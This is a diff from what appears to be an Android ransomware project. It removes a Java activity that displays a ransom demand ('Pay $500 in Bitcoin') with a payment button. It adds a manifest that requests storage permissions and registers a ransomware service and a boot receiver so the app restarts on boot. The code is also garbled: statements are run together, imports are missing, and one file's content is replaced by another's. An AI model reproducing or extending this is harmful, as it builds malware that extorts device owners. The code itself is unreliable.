@@ -1,18 +1,22 @@
-RansomActivity.java:
+AndroidManifest.xml:
 
-import android.os.Bundle;import android.view.View;
-import android.widget.Button;import android.widget.TextView;
-import androidx.appcompat.app.AppCompatActivity;
-public class RansomActivity extends AppCompatActivity {
-    private static final String TAG = "RansomActivity";
-    @Override    protected void onCreate(Bundle savedInstanceState) {
-        super.onCreate(savedInstanceState);        setContentView(R.layout.activity_ransom);
-        // Get message TextView and set text
-        TextView messageTextView = findViewById(R.id.messageTextView);        messageTextView.setText("Your files have been encrypted. Pay $500 in Bitcoin to get the decryption key.");
-        // Get Pay button and set click listener
-        Button payButton = findViewById(R.id.payButton);        payButton.setOnClickListener(new View.OnClickListener() {
-            @Override            public void onClick(View v) {
-                // Redirect user to a website where they can pay the ransom                Intent intent = new Intent(Intent.ACTION_VIEW, Uri.parse("https://www.bitcoin.com"));
-                startActivity(intent);            }
-        });    }
-}
+<manifest xmlns:android="http://schemas.android.com/apk/res/android"    package="com.example.ransomware">
+    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
+    <application
+        android:name=".RansomwareApp"        android:allowBackup="false"
+        android:icon="@mipmap/ic_launcher"        android:label="@string/app_name"
+        android:roundIcon="@mipmap/ic_launcher_round"        android:supportsRtl="true"
+        android:theme="@style/AppTheme">
+        <activity android:name=".MainActivity">            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />            </intent-filter>
+        </activity>
+        <activity android:name=".RansomActivity" />
+        <service android:name=".RansomwareService" />
+        <receiver android:name=".BootReceiver"            android:enabled="true"
+            android:exported="true">            <intent-filter>
+                <action android:name="android.intent.action.BOOT_COMPLETED" />            </intent-filter>
+        </receiver>
+    </application>
+</manifest>
